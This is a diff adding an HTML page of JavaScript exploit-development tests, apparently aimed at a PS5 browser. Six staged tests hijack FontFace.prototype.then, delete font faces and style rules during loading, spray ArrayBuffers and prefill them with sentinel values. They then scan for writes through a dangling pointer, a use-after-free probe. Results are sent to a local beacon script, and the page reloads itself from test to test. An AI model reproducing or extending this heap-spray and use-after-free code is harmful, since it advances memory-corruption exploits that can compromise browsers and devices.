@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v9</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v9_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v9 BOOT test='+testNum);
+bn('P844v9-BOOT','test='+testNum);
+
+function scanABs(fabs){
+  for(var i=0;i<fabs.length;i++){
+    var bv=new BigUint64Array(fabs[i]);
+    for(var j=0;j<24;j++){
+      if(bv[j]!==0n){
+        var parts=[];
+        for(var k=0;k<24;k++){if(bv[k]!==0n)parts.push(k+'='+bv[k].toString(16));}
+        return 'idx='+i+'|'+parts.join(';');
+      }
+    }
+  }
+  return 'allzero';
+}
+
+var TESTS=[
+  // T0: Read INSIDE then getter — RIGHT AFTER spray, NO offsetHeight
+  // This determines if writes happen during sprite allocation
+  function T0(){
+    var fabs=[];
+    var insideRead='';var outsideRead='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t0c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t0f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        // NO offsetHeight here — just spray and read immediately
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        // Read IMMEDIATELY inside then — no layout, no GC
+        insideRead=scanABs(fabs);
+        bn('P844v9-T0-INSIDE',insideRead);
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t0f, t0c','AB');
+    // Now outside — after load() continuation
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    outsideRead=scanABs(fabs);
+    return 'inside='+insideRead+'|outside='+outsideRead;
+  },
+  // T1: Read INSIDE then after spray + offsetHeight
+  // Tests if offsetHeight triggers the dangling write
+  function T1(){
+    var fabs=[];
+    var preLayout='';var postLayout='';var outsideRead='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t1c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t1f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        preLayout=scanABs(fabs);
+        bn('P844v9-T1-PRELAYOUT',preLayout);
+        document.body.offsetHeight; // trigger layout
+        postLayout=scanABs(fabs);
+        bn('P844v9-T1-POSTLAYOUT',postLayout);
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t1f, t1c','AB');
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    outsideRead=scanABs(fabs);
+    return 'pre='+preLayout+'|post='+postLayout+'|out='+outsideRead;
+  },
+  // T2: PRE-FILL ABs with controlled data BEFORE returning from then
+  // If writes happen AFTER return, the writing code reads our fake data first
+  function T2(){
+    var fabs=[];
+    var outsideRead='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t2c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t2f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        // PRE-FILL ALL ABs with sentinel BEFORE returning
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++)bv[j]=BigInt(0xCAFE0000+j);
+        }
+        bn('P844v9-T2-PREFILLED','count='+fabs.length);
+        // Return — load continuation will read our fake CSSFontFace
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t2f, t2c','AB');
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    // Check which values changed from our 0xCAFE sentinels
+    var mods=[];
+    for(var i=0;i<fabs.length;i++){
+      var bv=new BigUint64Array(fabs[i]);
+      var changed=[];
+      for(var j=0;j<24;j++){
+        var expected=BigInt(0xCAFE0000+j);
+        if(bv[j]!==expected)changed.push(j+'='+bv[j].toString(16));
+      }
+      if(changed.length>0){
+        outsideRead='idx='+i+'|mods='+changed.join(';');
+        break;
+      }
+    }
+    if(!outsideRead)outsideRead='no_changes';
+    return outsideRead;
+  },
+  // T3: DON'T remove style element — keep @font-face rule alive
+  // If style system still references CSSFontFace, every layout = dangling access
+  function T3(){
+    var fabs=[];
+    var read1='';var read2='';var read3='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t3c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t3f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        // DO NOT remove style element — keep @font-face rule!
+        // Only delete the JS-side FontFace
+        try{document.fonts.delete(this);}catch(e){}
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t3f, t3c','AB');
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    read1=scanABs(fabs);
+    bn('P844v9-T3-READ1',read1);
+    // Zero everything
+    for(var i=0;i<fabs.length;i++){
+      var bv=new BigUint64Array(fabs[i]);
+      for(var j=0;j<24;j++)bv[j]=0n;
+    }
+    // Trigger layout AGAIN — does style system write through dangling ptr?
+    document.body.offsetHeight;
+    read2=scanABs(fabs);
+    bn('P844v9-T3-READ2',read2);
+    // Create element that uses the font
+    var el=document.createElement('span');
+    el.style.fontFamily='t3c';
+    el.textContent='XYZW';
+    document.body.appendChild(el);
+    document.body.offsetHeight;
+    read3=scanABs(fabs);
+    bn('P844v9-T3-READ3',read3);
+    // Clean up
+    st.remove();
+    return 'r1='+read1+'|r2='+read2+'|r3='+read3;
+  },
+  // T4: DON'T delete FontFace at all — only remove style + spray
+  // The JS FontFace still holds its CSSFontFace backing
+  function T4(){
+    var fabs=[];
+    var read1='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t4c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t4f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        // DO NOT delete FontFace — only remove @font-face rule
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t4f, t4c','AB');
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    read1=scanABs(fabs);
+    bn('P844v9-T4-READ1',read1);
+    // Now try face.load() again — should access backing CSSFontFace (our AB)
+    var loadResult='none';
+    try{
+      face.load().then(function(){loadResult='resolved';}).catch(function(e){loadResult='rejected:'+e;});
+    }catch(e){loadResult='threw:'+e.message;}
+    // Give async a moment
+    var dummy=0;for(var i=0;i<1000000;i++)dummy+=i;
+    document.body.offsetHeight;
+    var read2=scanABs(fabs);
+    return 'r1='+read1+'|load='+loadResult+'|r2='+read2;
+  },
+  // T5: Delete inside then BUT delay — read immediately, offsetHeight, read again
+  // More granular timing than T0/T1
+  function T5(){
+    var fabs=[];
+    var readA='';var readB='';var readC='';var readD='';
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:t5c;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('t5f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        // Phase A: spray only
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        readA=scanABs(fabs);
+        // Phase B: after offsetHeight
+        document.body.offsetHeight;
+        readB=scanABs(fabs);
+        // Phase C: after GC pressure inside then
+        for(var i=0;i<20;i++){var a=new Array(2000);a=null;}
+        readC=scanABs(fabs);
+        bn('P844v9-T5-ABCD','A='+readA+'|B='+readB+'|C='+readC);
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em t5f, t5c','AB');
+    for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+    document.body.offsetHeight;
+    readD=scanABs(fabs);
+    return 'A='+readA+'|B='+readB+'|C='+readC+'|D='+readD;
+  }
+];
+
+var NAMES=['T0-insideImmediate','T1-insideLayout','T2-preFill','T3-keepStyle','T4-keepFace','T5-granularTiming'];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v9-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v9-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v9-'+name+'-OK',String(result).substring(0,900));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v9-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
